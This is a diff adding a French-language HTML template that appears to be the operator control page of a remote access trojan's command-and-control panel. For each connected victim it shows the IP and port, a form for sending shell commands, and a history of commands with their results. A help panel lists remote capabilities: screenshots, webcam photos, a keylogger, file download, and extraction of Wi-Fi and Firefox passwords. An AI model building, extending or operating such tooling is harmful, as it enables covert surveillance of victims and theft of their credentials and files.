@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Contrôle Client {{ client.id }}</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<body class="bg-light">
+<div class="container py-4">
+    <h2>🎮 Contrôle de Client {{ client.id }}</h2>
+    <p class="text-muted">IP : {{ client.addr[0] }} | Port : {{ client.addr[1] }}</p>
+
+    <form method="POST" class="mb-3">
+        <div class="input-group">
+            <input type="text" name="command" class="form-control" placeholder="Commande à exécuter" required>
+            <button class="btn btn-success" type="submit">Envoyer</button>
+        </div>
+    </form>
+
+    <div class="d-flex gap-2 mb-4">
+        <a href="{{ url_for('disconnect_client', client_id=client.id) }}" class="btn btn-danger">Déconnecter ce client</a>
+        <button type="button" class="btn btn-info" data-bs-toggle="modal" data-bs-target="#helpModal">Aide</button>
+        <a href="{{ url_for('index') }}" class="btn btn-secondary">Retour</a>
+    </div>
+
+    {% if client.history %}
+        <h4>📝 Historique :</h4>
+        <ul class="list-group">
+            {% for cmd, res in client.history %}
+                <li class="list-group-item">
+                    <strong>> {{ cmd }}</strong><br>
+                    <pre class="mt-2 mb-0">{{ res }}</pre>
+                </li>
+            {% endfor %}
+        </ul>
+    {% endif %}
+</div>
+
+<!-- Modal Aide -->
+<div class="modal fade" id="helpModal" tabindex="-1" aria-labelledby="helpModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg modal-dialog-scrollable">
+    <div class="modal-content bg-dark text-light">
+      <div class="modal-header">
+        <h5 class="modal-title" id="helpModalLabel">🛈 Commandes disponibles</h5>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Fermer"></button>
+      </div>
+      <div class="modal-body">
+        <ul>
+          <li><code>&lt;commande&gt;</code> – Exécute une commande shell</li>
+          <li><code>screenshot</code> – Capture l’écran</li>
+          <li><code>webcam</code> – Prend une photo via webcam</li>
+          <li><code>start_keylogger</code> – Démarre le keylogger</li>
+          <li><code>download file1;file2</code> – Télécharge des fichiers</li>
+          <li><code>generate_ssh_keypair</code> – Génère une clé SSH</li>
+          <li><code>wifi</code> – Récupère les mots de passe Wi-Fi</li>
+          <li><code>firefox_profiles</code> – Affiche les profils Firefox</li>
+          <li><code>firefox_password &lt;number_firefox_profiles&gt;</code> – Extrait les mots de passe Firefox</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+  // Remet automatiquement le focus dans l’input après envoi
+  window.onload = function() {
+    const input = document.querySelector('input[name="command"]');
+    if (input) {
+      input.focus();
+    }
+  };
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const form = document.querySelector("form");
+    if (form) {
+      form.addEventListener("submit", () => {
+        setTimeout(() => {
+          const input = document.querySelector('input[name="command"]');
+          if (input) input.focus();
+        }, 100);
+      });
+    }
+  });
+</script>
+
+</body>
+</html>
